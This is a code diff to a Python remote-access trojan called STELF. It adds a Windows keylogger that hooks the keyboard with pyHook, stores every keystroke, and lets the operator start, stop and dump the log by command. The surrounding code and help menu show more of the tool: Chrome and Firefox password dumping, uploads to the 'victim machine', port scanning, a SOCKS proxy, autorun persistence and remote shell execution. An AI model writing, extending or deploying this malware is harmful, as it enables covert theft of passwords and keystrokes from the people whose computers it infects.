@@ -19,6 +19,10 @@ import string
 if os.name == "nt":
 	import passdump
 	import win32net
+	import win32api
+	import win32con
+	import pyHook
+	import pythoncom
 	
 if sys.stdout.isatty():
 	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
@@ -508,6 +512,10 @@ class Information_Gathering:
 	"""
 	Functions related to gathering data from the system.
 	"""
+	def __init__(self):
+		self.keylog_thread = None
+		self.key_log = ""
+		
 	@windows_only
 	def dump_chrome(self):
 		return passdump.dump_chrome()
@@ -515,6 +523,47 @@ class Information_Gathering:
 	@windows_only
 	def dump_firefox(self):
 		return passdump.dump_firefox()
+		
+	@windows_only
+	def keylog_start(self):
+		def keypress(event):
+			if event.Ascii == 13:
+				self.key_log += "[RETURN]"
+			elif event.Ascii == 9:
+				self.key_log += "[TAB]"
+			else:
+				self.key_log += chr(event.Ascii)
+			return True
+			
+		def pumpit_louder():
+			ct = threading.currentThread()
+			while not ct.stopped():
+				hook = pyHook.HookManager()
+				hook.KeyDown = keypress
+				hook.HookKeyboard()
+				pythoncom.PumpMessages()
+				
+			hook.UnhookKeyboard()
+		
+		t = StoppableThread(target=pumpit_louder)
+		t.daemon = True
+		t.start()
+		
+		self.keylog_thread = t
+		
+		return "[+] Logging started."
+		
+	@windows_only
+	def keylog_stop(self):
+		self.keylog_thread.stop()
+		win32api.PostThreadMessage(self.keylog_thread.ident, win32con.WM_QUIT, 0, 0) # pythoncom.PumpMessages() stops when it gets a WM_QUIT message.
+		return "[+] Logging stopped."
+		
+	@windows_only
+	def keylog_dump(self):
+		log = self.key_log
+		self.key_log = ""
+		return log
 		
 class Networking:
 	"""
@@ -632,6 +681,7 @@ upload [file] - Upload file to victim machine.
 portscan [hosts] [ports] - Perform a port scan on given hosts.
 proxy start - Start SOCKSv4 proxy on victim.
 persist - Add STELF to autorun.
+keylog|keyscan [start|stop|dump] - Start or stop the keylogger, or print logged keys.
 help - This menu!
 '''
 			elif data.startswith("cd"):
@@ -667,6 +717,18 @@ help - This menu!
 					output = net.portscan(hosts, ports)
 				except Exception as e:
 					output = str(e)+"\nusage: portscan [host_range] [port_range]"
+			elif data.startswith("keylog") or data.startswith("keyscan"):
+				try:
+					arg = data.split()[1]
+				except:
+					output = "[*] Usage: keylog [start|stop|dump]"
+					arg = ""
+				if arg == "start":
+					output = info.keylog_start()
+				elif arg == "stop":
+					output = info.keylog_stop()
+				elif arg == "dump":
+					output = info.keylog_dump()
 			else:
 				output = execute.execute_shell_command(data)[1]
 				
